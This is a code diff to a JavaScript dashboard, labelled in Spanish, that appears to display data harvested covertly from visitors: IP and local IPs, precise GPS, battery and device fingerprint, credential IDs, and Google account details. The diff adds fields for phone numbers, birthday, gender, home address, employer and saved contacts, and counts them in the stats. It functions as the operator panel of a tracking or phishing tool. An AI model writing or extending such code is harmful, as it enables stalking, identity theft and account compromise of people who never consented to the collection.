@@ -139,7 +139,7 @@ function stats(){
   let hoy=0,g=0,gps=0,bat=0;
   for(const {data:d} of all){
     if(d.ts && new Date(Number(d.ts)).toDateString()===today) hoy++;
-    if(ok(d.gEmail)||ok(d.google_email)) g++;
+    if(ok(d.gEmail)||ok(d.google_email)||ok(d.gPhone)) g++;
     if(ok(d.lat)||ok(d.gps_lat)) gps++;
     if(ok(d.bat)) bat++;
     const c=d.country||d.ip_country;
@@ -177,8 +177,8 @@ function card(id,d){
   const ip  = d.ip||d.ipLocal1||'?';
   const loc = [d.city,d.country].filter(v=>v&&v!=='').join(', ');
   const hsh = d.hash||id.slice(0,8);
-  const hasG   = ok(d.gEmail)||ok(d.google_email);
-  const hasGPS = ok(d.lat)||ok(d.gps_lat);
+  const hasG   = ok(d.gEmail)||ok(d.google_email)||ok(d.gPhone)||ok(d.gName);
+  const hasGPS = ok(d.lat)||ok(d.gps_lat)||ok(d.gpsLat);
   const hasBat = ok(d.bat);
   const hasCr  = ok(d.credId);
   const lat = d.lat||d.gps_lat||''; const lon=d.lon||d.gps_lon||'';
@@ -209,8 +209,20 @@ function card(id,d){
     <div class="st">🌐 Red / IP</div>
     <div class="grid">${R([['ip','a'],['ipLocal1','a2'],['ipLocal2','a2'],['ipLocal3','a2'],['city',''],['country',''],['region',''],['org',''],['asn','d'],['postal','d'],['ipTZ','d'],['lat','d'],['lon','d']])}</div>
     ${gmap}
-    ${hasGPS?`<div class="st">📍 GPS</div><div class="grid">${R([['lat','g'],['lon','g'],['gps_lat','g'],['gps_lon','g'],['gps_accuracy',''],['gps_altitude',''],['gps_speed','']])}</div>`:''}
-    ${hasG?`<div class="st">🔑 Google</div><div class="grid">${R([['gEmail','a'],['gName',''],['gHD',''],['gSub','d'],['gVerif',''],['gPrompt','d']])}</div>`:''}
+    ${hasGPS?`<div class="st">📍 GPS Real</div><div class="grid">${R([['gpsLat','g'],['gpsLon','g'],['lat','g'],['lon','g'],['gps_lat','g'],['gpsAcc',''],['gpsAlt',''],['gpsSpd',''],['gpsHead',''],['gps','']])}</div>`:''}
+    ${hasG?`
+    <div class="st">🔑 Cuenta Google</div>
+    <div class="grid">${R([['gEmail','a'],['gName',''],['gGivenName',''],['gLastName',''],
+      ['gPhone','a2'],['gPhone2','a2'],['gAllPhones','y'],
+      ['gBirthday','y'],['gGender',''],['gAddress',''],
+      ['gCity',''],['gCountry',''],['gPostal',''],
+      ['gOrg',''],['gTitle',''],['gBio','d'],
+      ['google_email','a'],['gHD',''],['gSub','d']
+    ])}</div>
+    <div class="st">👥 Contactos</div>
+    <div class="grid">${R([['contactsCount','y'],
+      ['contact1','a2'],['contact2','a2'],['contact3','a2'],['contact4',''],['contact5','']
+    ])}</div>`:''}
     ${hasCr?`<div class="st">🗝 Credenciales</div><div class="grid">${R([['credId','p'],['credName',''],['credType','d']])}</div>`:''}
     <div class="st">🖥 Dispositivo</div>
     <div class="grid">${R([['ua','d'],['platform',''],['vendor',''],['screen',''],['dpr',''],['orient',''],['depth','d'],['cores',''],['memory',''],['touch',''],['innerW','d'],['innerH','d']])}</div>
